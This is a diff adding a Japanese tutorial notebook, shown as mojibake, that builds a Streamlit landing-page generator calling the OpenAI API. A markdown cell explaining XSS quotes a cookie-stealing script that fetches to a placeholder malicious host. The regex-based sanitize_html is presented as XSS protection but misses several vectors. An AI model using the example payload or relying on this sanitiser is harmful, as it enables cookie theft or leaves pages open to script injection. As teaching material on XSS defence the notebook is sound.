+      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.406 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.407 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.408 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.408 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.409 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.410 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.413 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.413 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.414 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.420 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.439 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.447 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.460 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.461 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.461 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.465 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.469 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.473 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.477 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.478 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.478 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.479 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.479 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.482 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.483 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
+      "2025-09-15 08:26:18.491 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
+     ]
+    }
+   ],
+   "source": [
+    "\n",
+    "# ãƒšãƒ¼ã‚¸è¨­å®šï¼ˆStreamlit ã‚¢ãƒ—ãƒªå®Ÿè¡Œæ™‚ã«æœ‰åŠ¹ï¼‰\n",
+    "st.set_page_config(\n",
+    "    page_title=\"LPã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼ï¼ˆAI + Editorï¼‰\",\n",
+    "    page_icon=\"âœ¨\",\n",
+    "    layout=\"wide\",\n",
+    ")\n",
+    "\n",
+    "st.title(\"âœ¨ LPã‚¸ã‚§ãƒãƒ¬ãƒ¼ã‚¿ãƒ¼ï¼ˆAIç”Ÿæˆ + Editorï¼‰\")\n",
+    "st.caption(\"â€œæ¯å›ã¡ãŒã†UIâ€ã‚’AIãŒç”Ÿæˆ â†’ å³ãƒšã‚¤ãƒ³ã§è‰²/æ–‡å­—/ç”»åƒã‚’ç·¨é›† â†’ AIå·®åˆ†ç·¨é›† â†’ ZIPå‡ºåŠ›\")\n",
+    "\n",
+    "with st.sidebar:\n",
+    "    st.header(\"åŸºæœ¬æƒ…å ±\")\n",
+    "    site_title = st.text_input(\"ã‚µã‚¤ãƒˆã‚¿ã‚¤ãƒˆãƒ« / åå‰\", \"Yamada Studio\")\n",
+    "    tagline    = st.text_input(\"ã‚­ãƒ£ãƒƒãƒã‚³ãƒ”ãƒ¼\", \"Design that ships.\")\n",
+    "    meta_desc  = st.text_input(\"meta description\", \"å°ã•ãé€Ÿãå‡ºã—ã¦ã€ç¶™ç¶šçš„ã«ç£¨ããŸã‚ã®ãƒ‡ã‚¶ã‚¤ãƒ³ã¨å®Ÿè£…ã€‚\")\n",
+    "    email      = st.text_input(\"é€£çµ¡å…ˆãƒ¡ãƒ¼ãƒ«\", \"hello@example.com\")\n",
+    "\n",
+    "    st.divider()\n",
+    "    st.header(\"ä¸–ç•Œè¦³ï¼ˆãƒ†ãƒ¼ãƒï¼‰\")\n",
+    "    theme = st.selectbox(\n",
+    "        \"Style Themeï¼ˆç”ŸæˆAIã«æ¸¡ã—ã¾ã™ï¼‰\",\n",
+    "        [\n",
+    "            \"ã‚·ãƒ³ãƒ—ãƒ«\",\"ãƒ“ã‚¸ãƒã‚¹\",\"å¯æ„›ã„\",\"ã‚¹ã‚¿ã‚¤ãƒªãƒƒã‚·ãƒ¥\",\"ãƒ¡ãƒ«ãƒ˜ãƒ³\",\"ã‚¢ãƒ¡ã‚³ãƒŸé¢¨\",\n",
+    "            \"å’Œé¢¨\",\"å’Œãƒ¢ãƒ€ãƒ³\",\"ãƒŸãƒ‹ãƒãƒ«\",\"æœªæ¥çš„ï¼ˆã‚µã‚¤ãƒãƒ¼é¢¨ï¼‰\",\"ãƒ¬ãƒˆãƒ­ãƒãƒƒãƒ—\",\n",
+    "            \"ã‚¨ãƒ¬ã‚¬ãƒ³ãƒˆ\",\"ãƒŠãƒãƒ¥ãƒ©ãƒ«\",\"ãƒ€ãƒ¼ã‚¯ãƒ¢ãƒ¼ãƒ‰\",\"é›‘èªŒé¢¨\",\"ã‚¯ãƒ¼ãƒ«\",\n",
+    "        ],\n",
+    "        index=0\n",
+    "    )\n",
+    "\n",
+    "    st.divider()\n",
+    "    st.header(\"ã‚³ãƒ³ãƒ†ãƒ³ãƒ„\")\n",
+    "    about_text   = st.text_area(\"Aboutæœ¬æ–‡\", height=90, value=\"å¤§é˜ªã‚’æ‹ ç‚¹ã«ã€ã‚¹ãƒ”ãƒ¼ãƒ‰ã¨å“è³ªã‚’ä¸¡ç«‹ã™ã‚‹ãƒ‡ã‚¶ã‚¤ãƒ³ï¼†å®Ÿè£…ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚å°ã•ãå‡ºã—ã¦ã€æ—©ãå­¦ã³ã€ç¶™ç¶šçš„ã«ç£¨ãã€‚\")\n",
+    "    features_csv = st.text_input(\"ç‰¹å¾´ï¼ˆã‚«ãƒ³ãƒåŒºåˆ‡ã‚Šï¼‰\", \"é«˜é€Ÿæ¤œè¨¼, æ˜å¿«ãªUI, ã‚¹ã‚±ãƒ¼ãƒ«è¨­è¨ˆ, é‹ç”¨ã—ã‚„ã™ã„, å“è³ªã¨ã‚¹ãƒ”ãƒ¼ãƒ‰, ãƒ‡ãƒ¼ã‚¿ãƒ‰ãƒªãƒ–ãƒ³\")\n",
+    "    works_csv    = st.text_input(\"å®Ÿç¸¾ï¼ˆã‚«ãƒ³ãƒåŒºåˆ‡ã‚Šï¼‰\", \"SaaSãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰, ECç‰¹é›†, æ¡ç”¨ã‚µã‚¤ãƒˆ\")\n",
+    "    testi_raw    = st.text_area(\n",
+    "        \"ãŠå®¢æ§˜ã®å£°ï¼ˆåå‰|è‚©æ›¸ã|ã‚³ãƒ¡ãƒ³ãƒˆ ã‚’æ”¹è¡Œï¼‰\",\n",
+    "        height=80,\n",
+    "        value=\"ä½è—¤ èŠ±å­|PM|æ„æ€æ±ºå®šãŒåœ§å€’çš„ã«é€Ÿããªã‚Šã¾ã—ãŸã€‚\\néˆ´æœ¨ æ¬¡éƒ|BizDev|åˆé€Ÿã‹ã‚‰è³ªã¾ã§ã€ãƒãƒ©ãƒ³ã‚¹ãŒç´ æ™´ã‚‰ã—ã„ã€‚\"\n",
+    "    )\n",
+    "\n",
+    "    st.divider()\n",
+    "    st.header(\"AI ç”Ÿæˆè¨­å®š\")\n",
+    "    temperature = st.slider(\"å¤šæ§˜æ€§ï¼ˆtemperatureï¼‰\", 0.2, 1.4, 1.0, 0.1)\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "ed2cfaff",
+   "metadata": {},
+   "source": [
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³4ï¼šå…¥åŠ›ãƒ‡ãƒ¼ã‚¿ã®æ•´å½¢ã¨å®‰å…¨å¯¾ç­–ï¼ˆãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£é–¢æ•°ï¼‰\n",
+    "\n",
+    "ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚µã‚¤ãƒ‰ãƒãƒ¼ã§å…¥åŠ›ã—ãŸæ–‡å­—åˆ—ã‚’ **ã‚¢ãƒ—ãƒªå†…éƒ¨ã§ä½¿ã„ã‚„ã™ã„å½¢å¼ã«æ•´ãˆã‚‹**\n",
+    "ã¾ãŸã¯ **ä¸æ­£ãªã‚³ãƒ¼ãƒ‰ã‚’å–ã‚Šé™¤ã„ã¦å®‰å…¨ã«ã™ã‚‹** ãŸã‚ã®è£œåŠ©é–¢æ•°ã‚’å®šç¾©ã—ã¾ã™ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### 1ï¸âƒ£ split_csvï¼ˆã‚«ãƒ³ãƒåŒºåˆ‡ã‚Š â†’ ãƒªã‚¹ãƒˆï¼‰\n",
+    "- å½¹å‰²ï¼šã‚«ãƒ³ãƒã§åŒºåˆ‡ã‚‰ã‚ŒãŸæ–‡å­—åˆ—ã‚’ã€ä½™è¨ˆãªç©ºç™½ã‚’å–ã‚Šé™¤ã„ãŸãƒªã‚¹ãƒˆã«å¤‰æ›ã€‚\n",
+    "- ä¾‹ï¼š\n",
+    "\n",
+    "    å…¥åŠ›: `\" é«˜é€Ÿæ¤œè¨¼, æ˜å¿«ãªUI , , ãƒ‡ãƒ¼ã‚¿ãƒ‰ãƒªãƒ–ãƒ³ \"`\n",
+    "\n",
+    "    å‡ºåŠ›: `[\"é«˜é€Ÿæ¤œè¨¼\", \"æ˜å¿«ãªUI\", \"ãƒ‡ãƒ¼ã‚¿ãƒ‰ãƒªãƒ–ãƒ³\"]`\n",
+    "---\n",
+    "\n",
+    "### 2ï¸âƒ£ parse_testimonialsï¼ˆãŠå®¢æ§˜ã®å£°ã‚’æ§‹é€ åŒ–ï¼‰\n",
+    "- å½¹å‰²ï¼šã€Œåå‰ï½œè‚©æ›¸ãï½œã‚³ãƒ¡ãƒ³ãƒˆã€ã®å½¢å¼ã§å…¥åŠ›ã•ã‚ŒãŸè¤‡æ•°è¡Œã®ãƒ†ã‚­ã‚¹ãƒˆã‚’ã€è¾æ›¸ã®ãƒªã‚¹ãƒˆï¼ˆList[Dict]ï¼‰ã«å¤‰æ›ã€‚\n",
+    "- å„è¡Œã¯ã€Œ|ã€ã§åˆ†å‰²ã—ã€æœ€åˆã®2ã¤ã‚’ `name` ã¨ `role`ã€æ®‹ã‚Šã‚’ `text` ã¨ã—ã¦ã¾ã¨ã‚ã¾ã™ã€‚\n",
+    "- ä¾‹ï¼š\n",
+    "\n",
+    "    å…¥åŠ›:\n",
+    "        ä½è—¤ èŠ±å­|PM|æ„æ€æ±ºå®šãŒé€Ÿããªã‚Šã¾ã—ãŸã€‚\n",
+    "        \n",
+    "    å‡ºåŠ›:\n",
+    "        [\n",
+    "            {\"name\": \"ä½è—¤ èŠ±å­\", \"role\": \"PM\", \"text\": \"æ„æ€æ±ºå®šãŒé€Ÿããªã‚Šã¾ã—ãŸã€‚\"},\n",
+    "        ]\n",
+    "---\n",
+    "\n",
+    "### 3ï¸âƒ£ sanitize_htmlï¼ˆå±é™ºãªHTMLã‚’é™¤å»ï¼‰\n",
+    "- å½¹å‰²ï¼šAI ãŒç”Ÿæˆã—ãŸ HTML ã‹ã‚‰ã€**å®‰å…¨ã§ãªã„ã‚³ãƒ¼ãƒ‰ã‚’å‰Šé™¤**ã€‚\n",
+    "- å¯¾è±¡:\n",
+    "    - `<script>ã€œ</script>` ã‚¿ã‚°\n",
+    "    - `onClick` ãªã©ã€Œonã€ã§å§‹ã¾ã‚‹ã‚¤ãƒ™ãƒ³ãƒˆå±æ€§\n",
+    "- ã“ã‚Œã«ã‚ˆã‚Šã€äºˆæœŸã›ã¬ JavaScript å®Ÿè¡Œã‚’é˜²ãã¾ã™ï¼ˆXSS å¯¾ç­–ï¼‰ã€‚\n",
+    "\n",
+    "#### ãªãœå±é™ºãªã®ã‹ï¼ˆXSSã®ä¾‹ï¼‰\n",
+    "Webãƒšãƒ¼ã‚¸ã®ä¸­ã§ JavaScript ã¯ã¨ã¦ã‚‚å¼·åŠ›ã§ã™ã€‚  \n",
+    "ã§ã‚‚ã€Œä»–äººãŒæ›¸ã„ãŸã‚³ãƒ¼ãƒ‰ã€ã‚’ãã®ã¾ã¾ãƒ–ãƒ©ã‚¦ã‚¶ã«è¡¨ç¤ºã™ã‚‹ã¨ã€æ‚ªæ„ã®ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå‹•ã„ã¦ã—ã¾ã†å±é™ºãŒã‚ã‚Šã¾ã™ã€‚  \n",
+    "ã“ã‚Œã‚’ **XSSï¼ˆã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ï¼‰** ã¨ã„ã„ã¾ã™ã€‚\n",
+    "\n",
+    "ä¾‹ï¼šAI ãŒç”Ÿæˆã—ãŸ HTML ã®ä¸­ã«ã“ã‚“ãªã‚³ãƒ¼ãƒ‰ãŒã‚ã£ãŸå ´åˆã€‚\n",
+    "\n",
+    "    <script>\n",
+    "        alert(\"ã‚ãªãŸã®ã‚¯ãƒƒã‚­ãƒ¼ã‚’é€ä¿¡ã—ã¾ã™\");\n",
+    "        fetch(\"http://æ‚ªæ„ã®ã‚ã‚‹ã‚µã‚¤ãƒˆ/?cookie=\" + document.cookie);\n",
+    "    </script>\n",
+    "\n",
+    "ãƒšãƒ¼ã‚¸ã‚’é–‹ã„ãŸäººã®ãƒ–ãƒ©ã‚¦ã‚¶ã§ã€å‹æ‰‹ã«ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå‹•ãã€**ãƒ­ã‚°ã‚¤ãƒ³æƒ…å ±ã‚„å€‹äººæƒ…å ±ã‚’ç›—ã¾ã‚Œã‚‹** å±é™ºãŒã‚ã‚Šã¾ã™ã€‚\n",
+    "\n",
+    "#### sanitize_html ãŒã‚„ã£ã¦ã„ã‚‹ã“ã¨\n",
+    "    html = re.sub(r\"(?is)<script.*?>.*?</script>\", \"\", html)\n",
+    "    html = re.sub(r'(?is)\\son\\w+\\s*=\\s*([\"\\']).*?\\1', \"\", html)\n",
+    "\n",
+    "- 1 è¡Œç›®ï¼š`<script>ã€œ</script>` ã‚¿ã‚°ã‚’è¦‹ã¤ã‘ã¦ä¸¸ã”ã¨å‰Šé™¤\n",
+    "- 2 è¡Œç›®ï¼š`onClick` ãªã©ã€Œonã€ã§å§‹ã¾ã‚‹ã‚¤ãƒ™ãƒ³ãƒˆå±æ€§ã‚’å‰Šé™¤\n",
+    "\n",
+    "ã“ã‚Œã«ã‚ˆã‚Šã€ãƒšãƒ¼ã‚¸ã‚’èª­ã¿è¾¼ã‚“ã ã ã‘ã§ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå‹•ãã®ã‚’é˜²ãã¾ã™ã€‚\n",
+    "\n",
+    "#### ğŸ’¡ ã¾ã¨ã‚\n",
+    "sanitize_html ã¯ **ã€ŒAI ãŒå‡ºåŠ›ã—ãŸ HTML ã‚’ãã®ã¾ã¾ä¿¡ã˜ãªã„ã€** ãŸã‚ã®å®‰å…¨å¼ã€‚\n",
+    "XSSï¼ˆæ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œï¼‰ã‚’é˜²ãã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ã‚¢ãƒ—ãƒªã‚’å®ˆã‚Šã¾ã™ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### ğŸ” ãƒã‚¤ãƒ³ãƒˆã¾ã¨ã‚\n",
+    "\n",
+    "| é–¢æ•°å | ä¸»ãªç”¨é€” |\n",
+    "|---|---|\n",
+    "| split_csv | ã‚«ãƒ³ãƒåŒºåˆ‡ã‚Šã®ãƒ†ã‚­ã‚¹ãƒˆã‚’ãƒªã‚¹ãƒˆã«å¤‰æ› |\n",
+    "| parse_testimonials | ã€Œåå‰ï½œè‚©æ›¸ãï½œã‚³ãƒ¡ãƒ³ãƒˆã€å½¢å¼ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’è¾æ›¸ãƒªã‚¹ãƒˆã«æ•´å½¢ |\n",
+    "| sanitize_html | HTMLã‹ã‚‰`<script>`ã‚¿ã‚°ã‚„`onClick`å±æ€§ã‚’å‰Šé™¤ã—ã¦å®‰å…¨æ€§ã‚’ç¢ºä¿ |\n",
+    "\n",
+    "ã“ã‚Œã‚‰ã¯ã€Œãƒ¡ã‚¤ãƒ³å‡¦ç†ã®å‰ã«ãƒ‡ãƒ¼ã‚¿ã‚’æ•´ãˆã‚‹ã€ãŸã‚ã® **ä¸‹æº–å‚™**ã€‚\n",
+    "\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 17,
+   "id": "78a46432",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "\n",
+    "def split_csv(s: str) -> List[str]:\n",
+    "    return [x.strip() for x in s.split(\",\") if x.strip()]\n",
+    "\n",
+    "def parse_testimonials(s: str) -> List[Dict[str, str]]:\n",
+    "    rows: List[Dict[str, str]] = []\n",
+    "    for line in s.splitlines():\n",
+    "        p = [u.strip() for u in line.split(\"|\")]\n",
+    "        if len(p) >= 3:\n",
+    "            rows.append({\"name\": p[0], \"role\": p[1], \"text\": \"|\".join(p[2:])})\n",
+    "    return rows\n",
+    "\n",
+    "def sanitize_html(html: str) -> str:\n",
+    "    # <script> ã¨ on* ãƒãƒ³ãƒ‰ãƒ©ã‚’é™¤å»ã—ã¦å®‰å…¨å´ã«å¯„ã›ã‚‹\n",
+    "    html = re.sub(r\"(?is)<script.*?>.*?</script>\", \"\", html)\n",
+    "    html = re.sub(r'(?is)\\son\\w+\\s*=\\s*([\"\\']).*?\\1', \"\", html)  # onClick ç­‰\n",
+    "    return html\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "57878385",
+   "metadata": {},
+   "source": [
+    "\n",
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³5ï¼šç”Ÿæˆãƒ—ãƒ­ãƒ³ãƒ—ãƒˆ & OpenAI å‘¼ã³å‡ºã—\n",
+    "\n",
+    "- **JSONã‚¹ã‚­ãƒ¼ãƒ**ã‚’å›ºå®šã—ã¦ã€å‡ºåŠ›ã‚’æ§‹é€ åŒ–\n",
+    "- ä¾‹å¤–ï¼ˆ`RateLimitError`, `APIStatusError` ãªã©ï¼‰ã‚’ã‚­ãƒ£ãƒƒãƒã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«èª¬æ˜\n"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": 18,
+   "id": "7c322179",
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "\n",
+    "def build_generate_prompt(theme: str, site_title: str, tagline: str, meta_desc: str,\n",
+    "                          email: str, about: str, feats: list, works: list, testi: list, seed: int) -> str:\n",
+    "    return f\"\"\"\n",
+    "ã‚ãªãŸã¯LPãƒ‡ã‚¶ã‚¤ãƒŠãƒ¼å…¼ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã§ã™ã€‚ä»¥ä¸‹ã®è¦ä»¶ã§ â€œå®ŒæˆHTML/CSSâ€ ã‚’ã‚¼ãƒ­ã‹ã‚‰ç”Ÿæˆã—ã¦ãã ã•ã„ã€‚\n",
+    "\n",
+    "# ã‚´ãƒ¼ãƒ«\n",
+    "- ã€Œ{theme}ã€ã®ä¸–ç•Œè¦³ã§ã€**åˆè¦‹ã§é•ã„ãŒåˆ†ã‹ã‚‹**LPã‚’ä½œã‚‹\n",
+    "- **HTMLã®æ§‹é€ **ãƒ»**è£…é£¾**ãƒ»**ã‚¿ã‚¤ãƒ**ãƒ»**ä½™ç™½**ãƒ»**ãƒ¢ãƒ¼ã‚·ãƒ§ãƒ³**ã¾ã§å¤‰ãˆã‚‹\n",
+    "- å¤–éƒ¨CDN/JSã¯ä½¿ã‚ãªã„ï¼ˆç´”HTML+CSSï¼‰ã€‚ç”»åƒã¯ãƒ€ãƒŸãƒ¼çŸ©å½¢ã§OKã€‚\n",
+    "\n",
+    "# å…¥åŠ›ãƒ‡ãƒ¼ã‚¿\n",
+    "- title: {site_title}\n",
+    "- tagline: {tagline}\n",
+    "- meta_description: {meta_desc}\n",
+    "- email: {email}\n",
+    "- about: {about}\n",
+    "- features: {feats}\n",
+    "- works: {works}\n",
+    "- testimonials: {testi}\n",
+    "- style_seed: {seed}\n",
+    "\n",
+    "# å³æ ¼ä»•æ§˜\n",
+    "- å‡ºåŠ›ã¯ JSON 1å€‹ã®ã¿ã€‚ã‚¹ã‚­ãƒ¼ãƒ:\n",
+    "  {{\n",
+    "    \"title\": \"string\",\n",
+    "    \"meta\": {{\"description\":\"string\"}},\n",
+    "    \"css\": \"string\",             // <style>ãªã—ã€ç´”CSSã®ã¿\n",
+    "    \"body_html\": \"string\"        // <body>å†…ã®ã¿ã€‚<html>/<head>ä¸è¦\n",
+    "  }}\n",
+    "\n",
+    "# ãƒ‡ã‚¶ã‚¤ãƒ³æŒ‡é‡\n",
+    "- åŒã˜ {theme} ã§ã‚‚æ¯å›**é…ç½®ãƒ»å½¢ãƒ»è£…é£¾**ãŒç•°ãªã‚‹ã“ã¨\n",
+    "- ã‚»ã‚¯ã‚·ãƒ§ãƒ³æ•°/é †åº/ã‚°ãƒªãƒƒãƒ‰/è£…é£¾ï¼ˆæ³¢å½¢/ã‚¹ãƒ†ãƒƒã‚«ãƒ¼/æ /ã‚°ãƒ­ãƒ¼ç­‰ï¼‰ã‚’**æ¯å›å¤‰ãˆã‚‹**\n",
+    "- :root ã§è‰²/è§’ä¸¸/å½±/ç·š/èƒŒæ™¯ãªã©ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å®šç¾©\n",
+    "- ç”»åƒã¯ <div aria-label=\"image\" class=\"img img--X\"> ã®ã‚ˆã†ãªãƒ€ãƒŸãƒ¼\n",
+    "- mailto: ã®CTAã‚’1ã¤ä»¥ä¸Š\n",
+    "\n",
+    "# ç¦æ­¢\n",
+    "- <script>ã€å¤–éƒ¨URLã€@importã€å®Ÿãƒ•ã‚¡ã‚¤ãƒ«ç”»åƒã®èª­ã¿è¾¼ã¿\n",
+    "\"\"\"\n",
+    "\n",
+    "def ai_generate(theme: str, site_title: str, tagline: str, meta_desc: str, email: str,\n",
+    "                about: str, feats: list, works: list, testi: list, temperature: float) -> Tuple[str, str]:\n",
+    "    if client is None:\n",
+    "        raise RuntimeError(\"OpenAI ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãŒåˆæœŸåŒ–ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚APIã‚­ãƒ¼è¨­å®šã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚\")\n",
+    "    seed = random.randint(1, 10_000_000)\n",
+    "    prompt = build_generate_prompt(theme, site_title, tagline, meta_desc, email, about, feats, works, testi, seed)\n",
+    "    resp = client.chat.completions.create(\n",
+    "        model=\"gpt-4o-mini\",\n",
+    "        temperature=temperature,\n",
+    "        response_format={\"type\": \"json_object\"},\n",
+    "        messages=[{\"role\": \"user\", \"content\": prompt}],\n",
+    "    )\n",
+    "    data = json.loads(resp.choices[0].message.content)\n",
+    "    css  = data[\"css\"]\n",
+    "    body = sanitize_html(data[\"body_html\"])\n",
+    "    return css, body\n"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "id": "65136335",
+   "metadata": {},
+   "source": [
+    "\n",
+    "## ã‚»ã‚¯ã‚·ãƒ§ãƒ³6ï¼šCSSå¤‰æ•°ãƒ»ç”»åƒãƒ»ãƒ†ã‚­ã‚¹ãƒˆã®ç·¨é›†ãƒ„ãƒ¼ãƒ«\n",
+    "ã“ã®ãƒ‘ãƒ¼ãƒˆã§ã¯ã€AI ãŒç”Ÿæˆã—ãŸ **CSS / HTML ã‚’å¾Œã‹ã‚‰ç·¨é›†ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãƒ„ãƒ¼ãƒ«é–¢æ•°** ã‚’ã¾ã¨ã‚ã¦ã„ã¾ã™ã€‚\n",
+    "è‰²ãƒ»è§’ä¸¸ãªã©ã®ãƒ†ãƒ¼ãƒè¨­å®šã€ãƒ€ãƒŸãƒ¼ç”»åƒã®å·®ã—æ›¿ãˆã€ãƒ†ã‚­ã‚¹ãƒˆã®ä¿®æ­£ã‚’è¡Œã†ãŸã‚ã®ä»•çµ„ã¿ã§ã™ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### 1ï¸âƒ£ CSS ã® `:root` å¤‰æ•°ã‚’æ‰±ã†\n",
+    "\n",
+    "- `:root` ã¯ **HTML å…¨ä½“ï¼ˆ<html>ï¼‰ã‚’æŒ‡ã™ CSS ã®ã‚»ãƒ¬ã‚¯ã‚¿**ã€‚\n",
+    "- ã“ã“ã«ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ï¼ˆCSSå¤‰æ•°ï¼‰ã‚’ã¾ã¨ã‚ã‚‹ã¨ã€è‰²ã‚„ä½™ç™½ãªã©ã‚’ä¸€æ‹¬ç®¡ç†ã§ãã¾ã™ã€‚\n",
+    "\n",
+    "ã“ã®ã‚³ãƒ¼ãƒ‰ã§ã¯æ­£è¦è¡¨ç¾ `VAR_RE` ã‚’ä½¿ã£ã¦ã€`:root { ... }` ã®ä¸­ã«ã‚ã‚‹å¤‰æ•°ã‚’æ¢ã—ã¦ã„ã¾ã™ã€‚\n",
+    "\n",
+    "- `extract_root_vars(css)` : `:root` ã®ä¸­ã‹ã‚‰ `--main-color` ãªã©ã®å¤‰æ•°åã¨å€¤ã‚’è¾æ›¸ã«æŠ½å‡º\n",
+    "- `replace_root_vars(css, new_vars)` : æŠ½å‡ºã—ãŸå¤‰æ•°ã‚’æ–°ã—ã„å€¤ã«ç½®ãæ›ãˆã€ãƒ†ãƒ¼ãƒã‚«ãƒ©ãƒ¼ã‚„è§’ä¸¸ã‚’æ›´æ–°\n",
+    "\n",
+    "> `VAR_RE` ã¯ **Variables + Regular Expression** ã®ç•¥ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### 2ï¸âƒ£ ç”»åƒãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€ã®å·®ã—æ›¿ãˆ\n",
+    "\n",
+    "AI ãŒç”Ÿæˆã™ã‚‹ HTML ã§ã¯ã€ç”»åƒãŒ `<div aria-label=\"image\">` ã®ã‚ˆã†ãª **ãƒ€ãƒŸãƒ¼è¦ç´ ** ã§å‡ºã¦ãã¾ã™ã€‚\n",
+    "\n",
+    "- `find_image_placeholders(html)` : HTML å†…ã‹ã‚‰ãƒ€ãƒŸãƒ¼ç”»åƒã‚’æ¢ã™  \n",
+    "- `data_uri_from_file(file)` : ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ç”»åƒã‚’ Base64ï¼ˆdata URIï¼‰å½¢å¼ã«å¤‰æ›  \n",
+    "- `replace_placeholder_with_img(html, placeholder, data_uri)` : ãƒ€ãƒŸãƒ¼ `<div>` ã‚’ `<img>` ã‚¿ã‚°ã«ç½®æ›\n",
+    "\n",
+    "> `IMG_PLACEHOLDER_RE` ã¯ **Image Placeholder + Regular Expression** ã®ç•¥ã€‚\n",
+    "\n",
+    "---\n",
+    "\n",
+    "### 3ï¸âƒ£ è¦‹å‡ºã—ã‚„ã‚µãƒ–ãƒ†ã‚­ã‚¹ãƒˆã‚’ç·¨é›†\n",
+    "\n",
+    "ãƒšãƒ¼ã‚¸ã®ã‚¿ã‚¤ãƒˆãƒ«ã‚„ã‚­ãƒ£ãƒƒãƒã‚³ãƒ”ãƒ¼ã‚’å¾Œã‹ã‚‰å¤‰æ›´ã§ãã‚‹ã‚ˆã†ã«ã—ã¦ã„ã¾ã™ã€‚\n",
+    "\n",
+    "- `extract_first_h1(html)` / `replace_first_h1(html, new_text)`  \n",
